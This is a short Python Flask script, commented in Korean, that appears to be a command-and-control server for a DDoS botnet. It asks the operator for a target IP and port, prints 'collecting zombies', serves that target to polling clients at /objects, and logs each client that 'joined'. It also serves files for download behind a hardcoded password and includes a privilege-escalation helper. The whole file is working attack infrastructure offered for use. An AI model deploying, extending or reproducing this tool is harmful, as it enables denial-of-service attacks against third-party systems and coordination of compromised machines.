from flask import Flask, request, send_from_directory, Response, jsonify
import os
import ctypes
import sys
from waitress import serve




ddosip = str(input("input the ip >"))
port = int(input("input the port >"))
print("well done. collecting zombies...")

def is_admin():
    """Check if the script is running as administrator."""
    return ctypes.windll.shell32.IsUserAnAdmin() != 0

def run_as_admin():
    """Re-launch the script with administrator privileges."""
    if sys.version_info[0] == 3:
        script = sys.argv[0]
    else:
        script = sys.argv[0].decode(sys.getfilesystemencoding())
    
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)

app = Flask(__name__)

# 정적 파일 디렉토리 설정
STATIC_FOLDER = "files"
os.makedirs(STATIC_FOLDER, exist_ok=True)

# 사용자 인증 정보 (간단한 예제용)
USERNAME = "admin"
PASSWORD = "MIICWgIBAAKBgFlFkeP2FFDGIbzyCK7YAmtl/xOsFN8+mm8Hk8XJfMo2ZMEaJvjrdusvHARo4oIU1OxtxNasU41MeSGg7xMurL6DRrEhB61qOKLydICyUX9w0dmS+r7kqTM9X4Ts+vwHBjBhIMYE8j7O5FUfSlVrCGUMFhEfxhvwehCO7Ijn8cgPAgMBAAEC"

def check_auth(username, password):
    """
    사용자 이름과 비밀번호를 확인합니다.
    """
    return username == USERNAME and password == PASSWORD

def authenticate():
    """
    인증 요청 메시지를 반환합니다.
    """
    return Response(
        'Access denied. Please provide valid credentials.', 401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'}
    )

@app.before_request
def before_request():
    """사이트에 접속할 때 비밀번호 인증을 요구."""
    auth = request.authorization
    if not auth or not check_auth(auth.username, auth.password):
        return authenticate()

@app.route('/')
def index():
    """인증 후 사이트의 기본 페이지."""
    return """
        <h1>Welcome to the secure site!</h1>
        <p>This is a password-protected page. Now you can download files.</p>
        <a href="/file.txt">Download file</a>
    """

@app.route('/<path:filename>', methods=['GET'])
def serve_file(filename):
    """
    요청된 파일을 private 디렉토리에서 찾아 반환합니다.
    인증되지 않은 요청은 차단됩니다.
    """
    file_path = os.path.join(STATIC_FOLDER, filename)
    ip = request.remote_addr
    print(ip + " get the file")
    if not os.path.exists(file_path):
        return f"File '{filename}' not found.", 404

    try:
        return send_from_directory(STATIC_FOLDER, filename, as_attachment=True)
    except Exception as e:
        return f"An error occurred while serving the file: {str(e)}", 500
        
        
@app.route('/objects', methods=['GET'])
def objects():
    """서버 정보 또는 파일 시스템 정보를 반환하는 페이지"""
    # 예시로 파일 디렉토리 내용을 JSON 형식으로 반환합니다.
    files_in_directory = os.listdir(STATIC_FOLDER)
    ip = request.remote_addr
    print(ip + " joined the server")
    # 서버 정보 추가 (예: 디렉토리 내 파일 목록)
    server_info = {
        "ip": ddosip,
        "port": port
    }

    # JSON 형식으로 반환
    return jsonify(server_info)

# 서버 실행
if __name__ == "__main__":
    serve(app, host="0.0.0.0", port=5000, threads=4, connection_limit=100, asyncore_use_poll=True)